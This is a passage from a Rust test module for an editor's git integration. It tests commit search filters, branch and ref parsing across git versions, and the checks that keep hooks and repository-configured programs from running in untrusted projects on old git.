            branch_search_revisions("refs/heads/feature", Some("main"), &existing).unwrap(),
            ["refs/heads/feature", "--not", "refs/heads/main"]
        );
        assert_eq!(
            branch_search_revisions("refs/heads/feature", Some("origin/main"), &existing).unwrap(),
            ["refs/heads/feature", "--not", "refs/remotes/origin/main"]
        );
        assert_eq!(
            branch_search_revisions("refs/heads/main", Some("main"), &existing).unwrap(),
            ["refs/heads/main"]
        );
        assert_eq!(
            branch_search_revisions("refs/heads/main", Some("origin/main"), &existing).unwrap(),
            ["refs/heads/main"],
            "the local branch of the default one is the default branch too"
        );
        assert_eq!(
            branch_search_revisions("refs/remotes/origin/main", Some("origin/main"), &existing)
                .unwrap(),
            ["refs/remotes/origin/main"]
        );
        assert!(branch_search_revisions("refs/heads/gone", Some("main"), &existing).is_err());
        assert!(branch_search_revisions("refs/heads/feature", None, &existing).is_err());
        assert!(branch_search_revisions("refs/heads/feature", Some("develop"), &existing).is_err());
        assert!(
            branch_search_revisions("--all", Some("main"), &refs(&["--all", "refs/heads/main"]))
                .is_err()
        );
    }

    #[allow(clippy::disallowed_methods)]
    #[track_caller]
    fn commit_as(
        directory: &Path,
        author: &str,
        date: &str,
        message: &str,
        files: &[(&str, &str)],
    ) -> Oid {
        for (path, content) in files {
            let path = directory.join(path);
            fs::create_dir_all(path.parent().unwrap()).unwrap();
            fs::write(&path, content).unwrap();
            git_command(directory, ["add", "--all"]);
        }
        let (name, email) = author.split_once(" <").unwrap();
        let email = email.trim_end_matches('>');
        let output = std::process::Command::new("git")
            .args(["commit", "--allow-empty", "-m", message])
            .current_dir(directory)
            .env("GIT_CONFIG_GLOBAL", "")
            .env("GIT_CONFIG_SYSTEM", "")
            .env("GIT_AUTHOR_NAME", name)
            .env("GIT_AUTHOR_EMAIL", email)
            .env("GIT_COMMITTER_NAME", name)
            .env("GIT_COMMITTER_EMAIL", email)
            .env("GIT_AUTHOR_DATE", date)
            .env("GIT_COMMITTER_DATE", date)
            .output()
            .unwrap();
        assert!(
            output.status.success(),
            "{}",
            String::from_utf8_lossy(&output.stderr)
        );
        Oid::from_str(&git_command_output(directory, ["rev-parse", "HEAD"])).unwrap()
    }

    #[gpui::test]
    async fn test_commit_search_filters_on_installed_git(cx: &mut TestAppContext) {
        use crate::commit_search::{
            CommitSearchEnvironment, CommitSearchPlan, parse_commit_search_query,
            plan_commit_search,
        };

        disable_git_global_config();
        cx.executor().allow_parking();

        let temp_dir = tempfile::tempdir().unwrap();
        let directory = temp_dir.path().join("repo");
        git_init_repo(&directory);
        let alice = "Alice <alice@example.com>";
        let bob = "Bob <bob@example.com>";
        let both = "Alice Bob <ab@example.com>";

        let initial = commit_as(
            &directory,
            alice,
            "2026-01-01T12:00:00+09:00",
            "initial",
            &[("a.txt", "a\n")],
        );
        let add_src = commit_as(
            &directory,
            bob,
            "2026-02-01T12:00:00+09:00",
            "add src",
            &[("src/lib.rs", "fn hello() {}\n")],
        );
        git_command(&directory, ["tag", "v1.0"]);
        git_command(&directory, ["checkout", "-b", "feature"]);
        let feature = commit_as(
            &directory,
            both,
            "2026-03-01T12:00:00+09:00",
            "feature work",
            &[("src/feature.rs", "let x = Needle.value;\n")],
        );
        git_command(&directory, ["tag", "-a", "release-2", "-m", "release two"]);
        git_command(&directory, ["checkout", "main"]);
        let docs = commit_as(
            &directory,
            alice,
            "2026-03-15T12:00:00+09:00",
            "docs",
            &[("docs/readme.md", "NeedleXvalue\n")],
        );
        let merge_date = "2026-04-01T12:00:00+09:00";
        {
            #[allow(clippy::disallowed_methods)]
            let output = std::process::Command::new("git")
                .args(["merge", "--no-ff", "-m", "Merge feature", "feature"])
                .current_dir(&directory)
                .env("GIT_CONFIG_GLOBAL", "")
                .env("GIT_CONFIG_SYSTEM", "")
                .env("GIT_AUTHOR_NAME", "Bob")
                .env("GIT_AUTHOR_EMAIL", "bob@example.com")
                .env("GIT_COMMITTER_NAME", "Bob")
                .env("GIT_COMMITTER_EMAIL", "bob@example.com")
                .env("GIT_AUTHOR_DATE", merge_date)
                .env("GIT_COMMITTER_DATE", merge_date)
                .output()
                .unwrap();
            assert!(
                output.status.success(),
                "{}",
                String::from_utf8_lossy(&output.stderr)
            );
        }
        let merge = Oid::from_str(&git_command_output(&directory, ["rev-parse", "HEAD"])).unwrap();
        git_command(&directory, ["checkout", "-b", "feature2"]);
        let feature2 = commit_as(
            &directory,
            "Carol <carol@example.com>",
            "2026-05-01T12:00:00+09:00",
            "feature2 only",
            &[("b.txt", "b\n")],
        );
        git_command(&directory, ["checkout", "main"]);

        let repository = open_repository(&directory, cx);
        let search = async |args: SearchCommitArgs| -> Result<Vec<Oid>> {
            let (search_tx, search_rx) = async_channel::unbounded();
            repository
                .search_commits(LogSource::All, args, search_tx)
                .await?;
            let mut found = Vec::new();
            while let Ok(sha) = search_rx.try_recv() {
                found.push(sha);
            }
            Ok(found)
        };
        let args = |edit: &dyn Fn(&mut SearchCommitArgs)| {
            let mut args = SearchCommitArgs::default();
            edit(&mut args);
            args
        };
        let date = |value: &str| {
            OffsetDateTime::parse(value, &time::format_description::well_known::Rfc3339)
                .unwrap()
                .unix_timestamp()
        };

        assert_eq!(
            search(args(&|args| args.authors = vec!["alice".into()]))
                .await
                .unwrap(),
            [docs, feature, initial]
        );
        assert_eq!(
            search(args(
                &|args| args.authors = vec!["alice".into(), "BOB".into()]
            ))
            .await
            .unwrap(),
            [feature],
            "several authors are anded, although git ors its --author options"
        );
        assert_eq!(
            search(args(&|args| {
                args.authors = vec!["alice".into(), "BOB".into()];
                args.case_sensitive = true;
            }))
            .await
            .unwrap(),
            Vec::<Oid>::new()
        );

        let listed = git_command_raw_output(
            &directory,
            [
                "for-each-ref".to_string(),
                format!("--format={TAG_LIST_FORMAT}"),
                "refs/tags/".to_string(),
            ],
        );
        let tags = TagInfo::parse_list(&listed);
        let plan = |query: &str| {
            plan_commit_search(
                &parse_commit_search_query(query),
                &CommitSearchEnvironment {
                    now: OffsetDateTime::now_utc(),
                    case_sensitive: false,
                    branches: &[],
                    tags: Some(&tags),
                    log_source: &LogSource::All,
                },
            )
        };
        let CommitSearchPlan::Search(tag_search) = plan("tag:release") else {
            panic!("expected a search");
        };
        assert_eq!(
            search(tag_search).await.unwrap(),
            [feature],
            "an annotated tag names the commit it points at, not the tag object"
        );
        let CommitSearchPlan::Search(tag_search) = plan("tag:v1") else {
            panic!("expected a search");
        };
        assert_eq!(search(tag_search).await.unwrap(), [add_src]);
        let CommitSearchPlan::Search(tag_and_text) = plan("tag:v1 add") else {
            panic!("expected a search");
        };
        assert_eq!(search(tag_and_text).await.unwrap(), [add_src]);
        let CommitSearchPlan::Search(tag_and_text) = plan("tag:v1 work") else {
            panic!("expected a search");
        };
        assert_eq!(
            search(tag_and_text).await.unwrap(),
            Vec::<Oid>::new(),
            "the message text narrows the tagged commits rather than adding to them"
        );

        assert_eq!(
            search(args(
                &|args| args.branch = Some("refs/heads/feature2".into())
            ))
            .await
            .unwrap(),
            [feature2],
            "a branch is searched for what the default branch does not have"
        );
        assert_eq!(
            search(args(&|args| args.branch = Some("refs/heads/main".into())))
                .await
                .unwrap()
                .len(),
            5,
            "the default branch itself is searched whole"
        );
        assert!(
            search(args(&|args| args.branch = Some("refs/heads/missing".into())))
                .await
                .is_err()
        );

        assert_eq!(
            search(args(&|args| args.path = Some("src/".into())))
                .await
                .unwrap(),
            [feature, add_src]
        );
        assert_eq!(
            search(args(&|args| args.path = Some("*.md".into())))
                .await
                .unwrap(),
            [docs],
            "a glob with no slash matches at any depth"
        );
        assert_eq!(
            search(args(&|args| args.path = Some("src/*.rs".into())))
                .await
                .unwrap(),
            [feature, add_src]
        );
        assert_eq!(
            search(args(&|args| args.path = Some("src/lib.r?".into())))
                .await
                .unwrap(),
            Vec::<Oid>::new(),
            "without a `*` the path is literal, so `?` is not a wildcard"
        );

        assert_eq!(
            search(args(
                &|args| args.since = Some(date("2026-03-10T00:00:00+09:00"))
            ))
            .await
            .unwrap(),
            [feature2, merge, docs]
        );
        assert_eq!(
            search(args(
                &|args| args.until = Some(date("2026-02-15T00:00:00+09:00"))
            ))
            .await
            .unwrap(),
            [add_src, initial]
        );

        assert_eq!(
            search(args(&|args| args.change = Some("needle.VALUE".into())))
                .await
                .unwrap(),
            [feature],
            "a `.` in the text is a dot, not any character, and case is ignored"
        );
        assert_eq!(
            search(args(&|args| {
                args.change = Some("needle.value".into());
                args.case_sensitive = true;
            }))
            .await
            .unwrap(),
            Vec::<Oid>::new()
        );

        assert_eq!(
            search(args(&|args| args.merges = MergeFilter::Only))
                .await
                .unwrap(),
            [merge]
        );
        assert_eq!(
            search(args(&|args| {
                args.merges = MergeFilter::Exclude;
                args.since = Some(date("2026-03-10T00:00:00+09:00"));
            }))
            .await
            .unwrap(),
            [feature2, docs]
        );
        assert_eq!(
            search(args(&|args| {
                args.query = "feature".into();
                args.sha_prefix = Some(feature2.to_string()[..6].to_string().into());
            }))
            .await
            .unwrap(),
            [feature2]
        );
        assert_eq!(
            search(args(&|args| args.commits = Some(Vec::new())))
                .await
                .unwrap(),
            Vec::<Oid>::new()
        );
    }

    #[gpui::test]
    async fn test_commit_search_survives_an_author_that_is_not_utf8(cx: &mut TestAppContext) {
        disable_git_global_config();
        cx.executor().allow_parking();

        let temp_dir = tempfile::tempdir().unwrap();
        let directory = temp_dir.path().join("repo");
        git_init_repo(&directory);
        let tree = git_command_output(&directory, ["write-tree"]);
        // A Latin-1 author with no encoding header, as older histories have: git prints the
        // bytes as they are.
        let mut commit_object = format!("tree {tree}\n").into_bytes();
        commit_object.extend_from_slice(b"author Jos\xe9 <jose@example.com> 1700000000 +0000\n");
        commit_object.extend_from_slice(b"committer Jos\xe9 <jose@example.com> 1700000000 +0000\n");
        commit_object.extend_from_slice(b"\nneedle latin\n");
        let object_path = temp_dir.path().join("commit-object");
        fs::write(&object_path, &commit_object).unwrap();
        let latin = git_command_output(
            &directory,
            [
                OsString::from("hash-object"),
                OsString::from("-t"),
                OsString::from("commit"),
                OsString::from("-w"),
                object_path.into_os_string(),
            ],
        );
        git_command(
            &directory,
            ["update-ref", "refs/heads/main", latin.as_str()],
        );
        let latin = Oid::from_str(&latin).unwrap();

        let repository = open_repository(&directory, cx);
        let search = async |args: SearchCommitArgs| -> Result<Vec<Oid>> {
            let (search_tx, search_rx) = async_channel::unbounded();
            repository
                .search_commits(LogSource::All, args, search_tx)
                .await?;
            let mut found = Vec::new();
            while let Ok(sha) = search_rx.try_recv() {
                found.push(sha);
            }
            Ok(found)
        };

        assert_eq!(
            search(SearchCommitArgs {
                query: "needle".into(),
                ..SearchCommitArgs::default()
            })
            .await
            .unwrap(),
            [latin]
        );
        assert_eq!(
            search(SearchCommitArgs {
                authors: vec!["jos".into(), "example.com".into()],
                ..SearchCommitArgs::default()
            })
            .await
            .unwrap(),
            [latin],
            "several authors are checked against the author header however it is encoded"
        );

        let error = search(SearchCommitArgs {
            path: Some("../outside".into()),
            ..SearchCommitArgs::default()
        })
        .await
        .unwrap_err()
        .to_string();
        assert!(
            error.starts_with("Could not search the commits: ") && error.contains("outside"),
            "git's own reason reaches the search box: {error}"
        );
    }

    #[test]
    fn test_sequencer_state_from_probes() {
        assert_eq!(
            sequencer_state_from_probes(SequencerProbes {
                in_progress: Some(SequencerKind::CherryPick),
                unmerged_paths: true,
                merge_in_progress: false,
                head_is_detached: false,
            }),
            Some(SequencerState {
                kind: SequencerKind::CherryPick,
                conflicted: true,
                certain: true,
            })
        );
        assert_eq!(
            sequencer_state_from_probes(SequencerProbes {
                in_progress: Some(SequencerKind::Rebase),
                unmerged_paths: false,
                merge_in_progress: false,
                head_is_detached: true,
            }),
            Some(SequencerState {
                kind: SequencerKind::Rebase,
                conflicted: false,
                certain: true,
            })
        );
        assert_eq!(
            sequencer_state_from_probes(SequencerProbes {
                in_progress: None,
                unmerged_paths: true,
                merge_in_progress: false,
                head_is_detached: true,
            }),
            Some(SequencerState {
                kind: SequencerKind::Rebase,
                conflicted: true,
                certain: false,
            }),
            "conflicts no sequencer ref accounts for, on the detached HEAD a rebase runs on, are \
             what a pre-2.13 git leaves behind"
        );
        assert_eq!(
            sequencer_state_from_probes(SequencerProbes {
                in_progress: None,
                unmerged_paths: true,
                merge_in_progress: false,
                head_is_detached: false,
            }),
            None,
            "the same conflicts on a branch are a `stash pop` / `am` / `merge --squash` and not a \
             rebase, which never runs on one"
        );
        assert_eq!(
            sequencer_state_from_probes(SequencerProbes {
                in_progress: None,
                unmerged_paths: true,
                merge_in_progress: true,
                head_is_detached: true,
            }),
            None,
            "an ordinary merge accounts for its own conflicts"
        );
        assert_eq!(
            sequencer_state_from_probes(SequencerProbes::default()),
            None
        );
        assert!(
            uncertain_rebase_message().contains("2.13"),
            "the banner has to name the version that would have answered this outright: {}",
            uncertain_rebase_message()
        );
    }

    #[test]
    fn test_git_global_args_follow_git_version() {
        assert!(!git_global_args(version(2, 14, 9), true).contains(&"--no-optional-locks"));
        for git_version in [version(2, 15, 0), version(2, 45, 1), None] {
            assert!(
                git_global_args(git_version, true).contains(&"--no-optional-locks"),
                "{git_version:?} should get --no-optional-locks"
            );
        }
        assert_eq!(
            git_global_args(None, true),
            [
                "-c",
                "core.fsmonitor=false",
                "-c",
                "log.showSignature=false",
                "--no-optional-locks",
                "--no-pager",
            ]
        );
        assert_eq!(
            git_global_args(None, false),
            [
                "-c",
                "core.fsmonitor=false",
                "-c",
                "log.showSignature=false",
                "--no-optional-locks",
                "--no-pager",
                "-c",
                "core.hooksPath=/dev/null",
                "-c",
                "core.sshCommand=ssh",
                "-c",
                "credential.helper=",
                "-c",
                "protocol.ext.allow=never",
                "-c",
                "merge.verifySignatures=false",
                "-c",
                "diff.submodule=short",
                "-c",
                "diff.external=",
            ]
        );
        assert_eq!(
            git_global_args(version(2, 1, 1), false),
            git_global_args(None, false)
                .into_iter()
                .filter(|argument| *argument != "--no-optional-locks")
                .collect::<Vec<_>>()
        );
        // Git before 2.1.1 fails commands over an empty `-c` value.
        assert_eq!(
            git_global_args(version(1, 9, 1), false),
            [
                "-c",
                "core.fsmonitor=false",
                "-c",
                "log.showSignature=false",
                "--no-pager",
                "-c",
                "core.hooksPath=/dev/null",
                "-c",
                "core.sshCommand=ssh",
                "-c",
                "protocol.ext.allow=never",
                "-c",
                "merge.verifySignatures=false",
                "-c",
                "diff.submodule=short",
            ]
        );
    }

    #[gpui::test]
    async fn test_build_command_omits_options_the_git_version_lacks(cx: &mut TestAppContext) {
        let git = pretend_git_binary(
            "git-1.8.3-for-build-command",
            GitVersion::new(1, 8, 3),
            true,
            cx,
        );
        let command = git.build_command(&["status"]).await;
        assert_eq!(
            command
                .get_args()
                .map(|argument| argument.to_string_lossy().into_owned())
                .collect::<Vec<_>>(),
            [
                "-c",
                "core.fsmonitor=false",
                "-c",
                "log.showSignature=false",
                "--no-pager",
                "status",
            ]
        );
    }

    async fn command_arguments(git: &GitBinary, args: &[&str]) -> Vec<String> {
        git.build_command(args)
            .await
            .get_args()
            .map(|argument| argument.to_string_lossy().into_owned())
            .collect()
    }

    #[gpui::test]
    async fn test_build_command_keeps_git_2_7_worktree_from_crashing(cx: &mut TestAppContext) {
        let no_pager = "--no-pager".to_string();
        let git = pretend_git_binary("git-2.7.4-for-worktree", GitVersion::new(2, 7, 4), true, cx);
        assert!(
            !command_arguments(&git, &["worktree", "list", "--porcelain"])
                .await
                .contains(&no_pager)
        );
        assert!(
            command_arguments(&git, &["status"])
                .await
                .contains(&no_pager)
        );

        let git = pretend_git_binary(
            "git-2.11.0-for-worktree",
            GitVersion::new(2, 11, 0),
            true,
            cx,
        );
        assert!(
            command_arguments(&git, &["worktree", "list", "--porcelain"])
                .await
                .contains(&no_pager)
        );
    }

    #[gpui::test]
    async fn test_untrusted_operations_wait_for_trust_when_git_cannot_protect_them(
        cx: &mut TestAppContext,
    ) {
        let git = pretend_git_binary("git-2.8.6-for-trust", GitVersion::new(2, 8, 6), false, cx);
        let error = git
            .ensure_hooks_are_disabled_if_untrusted("Commit")
            .await
            .expect_err("git 2.8 ignores core.hooksPath");
        assert_eq!(
            error.to_string(),
            "This project is not trusted, and an old git (older than 2.9.0; this one is 2.8.6) cannot turn off hooks, so \"Commit\" cannot run. Trust the project to run it."
        );
        let error = git
            .ensure_transports_are_restricted_if_untrusted("Fetch")
            .await
            .expect_err("git 2.8 ignores protocol.ext.allow");
        assert_eq!(
            error.to_string(),
            "This project is not trusted, and an old git (older than 2.12.0; this one is 2.8.6) cannot stop the repository's settings from running programs, so \"Fetch\" cannot run. Trust the project to run it."
        );
        {
            let _japanese = i18n::test_support::LocaleOverride::new(Some(
                i18n_catalog::test_support::bundled_catalog("ja"),
            ));
            let error = git
                .ensure_hooks_are_disabled_if_untrusted(i18n::tc!("git result", "Commit"))
                .await
                .expect_err("git 2.8 ignores core.hooksPath");
            assert_eq!(
                error.to_string(),
                "このプロジェクトは信頼されていないため、古い git (2.9.0 未満。いまの git は 2.8.6) ではフックを止められず、コミットを実行できません。プロジェクトを信頼すると実行できます。"
            );
            let error = git
                .ensure_transports_are_restricted_if_untrusted(i18n::tc!("git result", "Fetch"))
                .await
                .expect_err("git 2.8 ignores protocol.ext.allow");
            assert_eq!(
                error.to_string(),
                "このプロジェクトは信頼されていないため、古い git (2.12.0 未満。いまの git は 2.8.6) ではリポジトリの設定からプログラムが実行されるのを止められず、フェッチを実行できません。プロジェクトを信頼すると実行できます。"
            );
        }

        let git = pretend_git_binary("git-2.8.6-for-trust", GitVersion::new(2, 8, 6), true, cx);
        git.ensure_hooks_are_disabled_if_untrusted("Commit")
            .await
            .unwrap();
        git.ensure_transports_are_restricted_if_untrusted("Fetch")
            .await
            .unwrap();

        let git = pretend_git_binary("git-2.10.0-for-trust", GitVersion::new(2, 10, 0), false, cx);
        git.ensure_hooks_are_disabled_if_untrusted("Commit")
            .await
            .unwrap();
        git.ensure_transports_are_restricted_if_untrusted("Fetch")
            .await
            .expect_err("git 2.10 ignores protocol.ext.allow");

        let git = pretend_git_binary("git-2.12.0-for-trust", GitVersion::new(2, 12, 0), false, cx);
        git.ensure_hooks_are_disabled_if_untrusted("Commit")
            .await
            .unwrap();
        git.ensure_transports_are_restricted_if_untrusted("Fetch")
            .await
            .unwrap();
    }

    #[test]
    fn test_commit_args_follow_git_version() {
        assert_eq!(suppress_diff_argument(version(1, 8, 3)), "-s");
        assert_eq!(suppress_diff_argument(version(1, 8, 4)), "--no-patch");
        assert_eq!(suppress_diff_argument(None), "--no-patch");

        assert_eq!(cat_file_blob_batch_argument(version(1, 8, 3)), "--batch");
        assert_eq!(cat_file_blob_batch_argument(None), "--batch=%(objectsize)");

        let show = [
            "show",
            "--format=",
            "-z",
            "--no-renames",
            "--raw",
            "--no-abbrev",
            "--first-parent",
        ];
        assert_eq!(commit_diff_args(None), show);
        assert_eq!(commit_diff_args(version(2, 2, 0)), show);
        assert_eq!(
            commit_diff_args(version(2, 1, 4)),
            [
                "diff-tree",
                "--no-commit-id",
                "-r",
                "-z",
                "--raw",
                "--no-abbrev",
                "--no-renames",
                "--root",
                "-m",
                "--first-parent",
            ]
        );

        assert_eq!(
            log_order_argument(LogOrder::AuthorDateOrder, version(1, 8, 3)),
            "--date-order"
        );
        assert_eq!(
            log_order_argument(LogOrder::AuthorDateOrder, version(1, 8, 4)),
            "--author-date-order"
        );
        assert_eq!(
            log_order_argument(LogOrder::TopoOrder, version(1, 7, 9)),
            "--topo-order"
        );
    }

    #[test]
    fn test_diff_tree_args() {
        let args = |request: DiffTreeType, merge_base: Option<&str>| {
            diff_tree_args(&request, merge_base)
                .into_iter()
                .map(|argument| argument.to_string_lossy().into_owned())
                .collect::<Vec<_>>()
        };
        let merge_base = || DiffTreeType::MergeBase {
            base: "main".into(),
            head: "feature".into(),
        };
        let merge_base_with_worktree = || DiffTreeType::MergeBaseWithWorktree {
            base: "main".into(),
        };

        assert_eq!(
            args(merge_base(), None),
            [
                "diff-tree",
                "-r",
                "-z",
                "--abbrev=64",
                "--no-renames",
                "--merge-base",
                "main",
                "feature",
                "--"
            ]
        );
        assert_eq!(
            args(merge_base(), Some("abc123")),
            [
                "diff-tree",
                "-r",
                "-z",
                "--abbrev=64",
                "--no-renames",
                "abc123",
                "feature",
                "--"
            ]
        );
        assert_eq!(
            args(merge_base_with_worktree(), None),
            [
                "diff",
                "--raw",
                "-z",
                "--abbrev=64",
                "--no-renames",
                "--merge-base",
                "main",
                "--"
            ]
        );
        assert_eq!(
            args(merge_base_with_worktree(), Some("abc123")),
            [
                "diff",
                "--raw",
                "-z",
                "--abbrev=64",
                "--no-renames",
                "abc123",
                "--"
            ]
        );
        assert_eq!(
            args(
                DiffTreeType::Since {
                    base: "a".into(),
                    head: "b".into(),
                },
                None
            ),
            [
                "diff-tree",
                "-r",
                "-z",
                "--abbrev=64",
                "--no-renames",
                "a",
                "b",
                "--"
            ]
        );
    }

    #[test]
    fn test_branch_list_args_follow_git_version() {
        // No `%(upstream:track)`: only the current branch's counts are wanted, and
        // `count_head_tracking` asks for those alone.
        let modern_fields = "%(HEAD)%00%(objectname)%00%(parent)%00%(refname)%00%(upstream)%00%00%(committerdate:unix)%00%(authorname)%00%(contents:subject)";
        let modern = strings(&[
            "for-each-ref",
            "refs/heads/**/*",
            "refs/remotes/**/*",
            "--format",
            modern_fields,
        ]);
        assert_eq!(branch_list_args(None), modern);
        assert_eq!(branch_list_args(version(2, 9, 4)), modern);
        assert_eq!(
            branch_list_args(version(2, 7, 4)),
            strings(&[
                "for-each-ref",
                "refs/heads/**/*",
                "refs/remotes/**/*",
                "--format",
                &modern_fields.replace("committerdate:unix", "committerdate:raw"),
            ])
        );
        assert_eq!(
            branch_list_args(version(1, 8, 3)),
            strings(&[
                "for-each-ref",
                "refs/heads/",
                "refs/remotes/",
                "--format",
                "%00%(objectname)%00%(parent)%00%(refname)%00%(upstream)%00%00%(committerdate:raw)%00%(authorname)%00%(contents:subject)",
            ])
        );
    }

    #[test]
    fn test_branches_parsing_of_older_git_output() {
        // Verbatim row of git 1.9.1, whose `%(committerdate:raw)` carries a time zone.
        #[allow(clippy::octal_escapes)]
        let input = "*\0060964da10574cd9bf06463a53bf6e0769c5c45e\0895951d681e5561478c0acdd6905e8aacdfd2249\0refs/heads/main\0\0\01789181244 +0000\0alice\0third\n";
        assert_eq!(
            parse_branch_input(input, version(1, 9, 1)).unwrap(),
            vec![Branch {
                is_head: true,
                ref_name: "refs/heads/main".into(),
                upstream: None,
                most_recent_commit: Some(CommitSummary {
                    sha: "060964da10574cd9bf06463a53bf6e0769c5c45e".into(),
                    subject: "third".into(),
                    commit_timestamp: 1789181244,
                    author_name: "alice".into(),
                    has_parent: true,
                })
            }]
        );

        // Git before 1.9 gets empty `%(HEAD)` and `%(upstream:track)` fields.
        #[allow(clippy::octal_escapes)]
        let input = "\0060964da10574cd9bf06463a53bf6e0769c5c45e\0\0refs/heads/main\0refs/remotes/origin/main\0\01789181244 +0900\0alice\0first\n";
        assert_eq!(
            parse_branch_input(input, version(1, 8, 3)).unwrap(),
            vec![Branch {
                is_head: false,
                ref_name: "refs/heads/main".into(),
                upstream: Some(Upstream {
                    ref_name: "refs/remotes/origin/main".into(),
                    tracking: UpstreamTracking::Tracked(UpstreamTrackingStatus {
                        ahead: 0,
                        behind: 0
                    }),
                }),
                most_recent_commit: Some(CommitSummary {
                    sha: "060964da10574cd9bf06463a53bf6e0769c5c45e".into(),
                    subject: "first".into(),
                    commit_timestamp: 1789181244,
                    author_name: "alice".into(),
                    has_parent: false,
                })
            }]
        );
    }

    #[test]
    fn test_branches_parsing_of_unrecognized_fields() {
        #[allow(clippy::octal_escapes)]
        let input = " \0060964da10574cd9bf06463a53bf6e0769c5c45e\0\0refs/heads/odd\0refs/remotes/origin/odd\0[ahead many]\0yesterday\0alice\0odd\n";
        // As before, such a row is skipped on git whose output for it is reliable.
        assert_eq!(parse_branch_input(input, None).unwrap(), Vec::new());
        assert_eq!(
            parse_branch_input(input, version(2, 13, 0)).unwrap(),
            Vec::new()
        );
        assert_eq!(
            parse_branch_input(input, version(1, 9, 1)).unwrap().len(),
            1
        );
        let branches = parse_branch_input(input, version(1, 8, 3)).unwrap();
        assert_eq!(branches.len(), 1);
        assert_eq!(
            branches[0].tracking_status(),
            Some(UpstreamTrackingStatus {
                ahead: 0,
                behind: 0
            })
        );
        assert_eq!(
            branches[0]
                .most_recent_commit
                .as_ref()
                .map(|commit| commit.commit_timestamp),
            Some(0)
        );
    }

    #[test]
    fn test_mark_missing_upstreams_gone() {
        let branch = |ref_name: &str, upstream: Option<&str>| Branch {
            is_head: false,
            ref_name: ref_name.to_string().into(),
            upstream: upstream.map(|upstream| Upstream {
                ref_name: upstream.to_string().into(),
                tracking: UpstreamTracking::Tracked(UpstreamTrackingStatus {
                    ahead: 0,
                    behind: 110,
                }),
            }),
            most_recent_commit: None,
        };
        let mut branches = vec![
            branch("refs/heads/main", Some("refs/remotes/origin/main")),
            branch("refs/heads/pruned", Some("refs/remotes/origin/pruned")),
            branch("refs/heads/local", Some("refs/heads/main")),
            branch("refs/heads/custom", Some("refs/custom/elsewhere")),
            branch("refs/remotes/origin/main", None),
        ];
        mark_missing_upstreams_gone(&mut branches);
        let tracking = branches
            .iter()
            .map(|branch| {
                branch
                    .upstream
                    .as_ref()
                    .map(|upstream| upstream.tracking.is_gone())
            })
            .collect::<Vec<_>>();
        assert_eq!(
            tracking,
            [Some(false), Some(true), Some(false), Some(false), None]
        );
    }

    fn write_ref(common_dir: &Path, ref_name: &str, contents: &str) {
        let path = common_dir.join(ref_name);
        fs::create_dir_all(path.parent().unwrap()).unwrap();
        fs::write(path, contents).unwrap();
    }

    fn scan_without_limits(common_dir: &Path) -> RefStorageScan {
        scan_ref_storage(common_dir, usize::MAX, Duration::from_secs(60))
    }

    #[test]
    fn test_scan_ref_storage_counts_loose_refs_up_to_the_limit() {
        let common_dir = tempfile::tempdir().unwrap();
        let common_dir = common_dir.path();
        write_ref(common_dir, "refs/heads/main", "a\n");
        write_ref(common_dir, "refs/heads/feature/login", "b\n");
        write_ref(common_dir, "refs/remotes/origin/main", "a\n");
        write_ref(common_dir, "refs/tags/v1", "a\n");
        write_ref(common_dir, "refs/tags/リリース/春", "b\n");
        // git's transient lock files are not refs.
        write_ref(common_dir, "refs/heads/main.lock", "c\n");

        assert_eq!(
            scan_without_limits(common_dir).loose_refs,
            Some(LooseRefCount {
                count: 5,
                complete: true,
            })
        );
        // Tags are all counted first (the fingerprint needs every one of them); the other refs
        // only up to what is left of the limit.
        assert_eq!(
            scan_ref_storage(common_dir, 3, Duration::from_secs(60)).loose_refs,
            Some(LooseRefCount {
                count: 3,
                complete: false,
            })
        );
        assert_eq!(
            scan_ref_storage(common_dir, 5, Duration::from_secs(60)).loose_refs,
            Some(LooseRefCount {
                count: 5,
                complete: true,
            })
        );

        // Out of time before a single file: what little was counted is only a lower bound, and
        // the tags cannot be vouched for.
        let rushed = scan_ref_storage(common_dir, usize::MAX, Duration::ZERO);
        assert_eq!(
            rushed.loose_refs,
            Some(LooseRefCount {
                count: 0,
                complete: false,
            })
        );
        assert_eq!(rushed.tags_fingerprint, None);

        let without_refs = tempfile::tempdir().unwrap();
        assert_eq!(scan_without_limits(without_refs.path()).loose_refs, None);
    }

    #[test]
    fn test_scan_ref_storage_fingerprints_only_the_tags() {
        let common_dir = tempfile::tempdir().unwrap();
        let common_dir = common_dir.path();
        write_ref(common_dir, "refs/heads/main", "1111\n");
        write_ref(common_dir, "refs/tags/v1", "1111\n");
        let fingerprint = || scan_without_limits(common_dir).tags_fingerprint;

        let initial = fingerprint();
        assert!(initial.is_some());
        assert_eq!(fingerprint(), initial, "nothing changed");

        // A commit or a fetch moves branches, which must not look like a tag change.
        write_ref(common_dir, "refs/heads/main", "22222\n");
        write_ref(common_dir, "refs/remotes/origin/main", "22222\n");
        assert_eq!(fingerprint(), initial);

        write_ref(common_dir, "refs/tags/v2", "22222\n");
        let with_new_tag = fingerprint();
        assert_ne!(with_new_tag, initial, "a new tag");

        write_ref(common_dir, "refs/tags/v2", "333333\n");
        let with_moved_tag = fingerprint();
        assert_ne!(with_moved_tag, with_new_tag, "a moved tag");

        fs::remove_file(common_dir.join("refs/tags/v2")).unwrap();
        let without_tag = fingerprint();
        assert_ne!(without_tag, with_moved_tag, "a deleted tag");

        // Packed tags (and the ones `git tag -d` deletes from there) live in `packed-refs`.
        fs::write(common_dir.join("packed-refs"), "4444 refs/tags/v3\n").unwrap();
        assert_ne!(fingerprint(), without_tag, "a packed tag");
    }

    #[test]
    fn test_scan_ref_storage_with_reftable() {
        let common_dir = tempfile::tempdir().unwrap();
        let common_dir = common_dir.path();
        // What `git init --ref-format=reftable` leaves: a stub `refs/heads` file for older gits
        // and the tables themselves.
        write_ref(
            common_dir,
            "refs/heads",
            "this repository uses the reftable format\n",
        );
        write_ref(common_dir, "reftable/tables.list", "0x01.ref\n");

        let scan = scan_without_limits(common_dir);
        assert_eq!(
            scan.loose_refs,
            Some(LooseRefCount {
                count: 0,
                complete: true,
            })
        );
        let initial = scan.tags_fingerprint;
        assert!(initial.is_some());
        write_ref(common_dir, "reftable/tables.list", "0x01.ref\n0x02.ref\n");
        assert_ne!(scan_without_limits(common_dir).tags_fingerprint, initial);
    }

    #[test]
    fn test_parse_left_right_counts() {
        assert_eq!(parse_left_right_counts("2\t5\n"), Some((2, 5)));
        assert_eq!(parse_left_right_counts("2\n"), None);
        assert_eq!(parse_left_right_counts("two\t5\n"), None);
    }

    #[test]
    fn test_legacy_stash_command() {
        let command = |requested: &[&str],
                       status: &GitStatus,
                       message: Option<&str>,
                       git_version: Option<GitVersion>| {
            let requested = requested
                .iter()
